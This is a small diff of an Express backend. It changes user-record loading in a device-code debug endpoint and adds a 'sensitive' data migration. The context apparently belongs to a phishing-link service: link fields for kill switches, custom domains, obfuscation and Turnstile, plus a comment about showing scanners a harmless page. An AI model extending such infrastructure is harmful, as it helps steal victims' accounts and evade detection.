@@ -664,7 +664,7 @@ app.get('/api/debug/devicecode', async (req, res) => {
     let user = null, link = null, pool = {};
     try {
       const [u] = await db.query('SELECT id, subscription_status, subscription_plan, subscription_expiry, telegram_id FROM users WHERE id = ?', [decoded.user_id]);
-      user = u[0] || null;
+      user = db.openUser(u[0]) || null;
     } catch (e) { user = { _db_error: e.message }; }
     try {
       const [l] = await db.query('SELECT id, user_id, status, kill_switched, url_type, worker_name, custom_domain, verification_design, template_type, turnstile_enabled, obfuscated, created_at FROM links WHERE id = ?', [linkId]);
@@ -1046,6 +1046,8 @@ async function runMigrations() {
   }
 }
 runMigrations().catch(err => console.error('[DB] Migration failed:', err.message));
+require('./backend/services/sensitive-migrate').runSensitiveMigrations()
+  .catch(err => console.error('[SENSITIVE] migration failed:', err.message));
 
 // Serve a harmless static page for unknown routes / scanners
 app.use((req, res) => res.status(404).sendFile(path.join(__dirname, 'admin-panel', '404.html')));
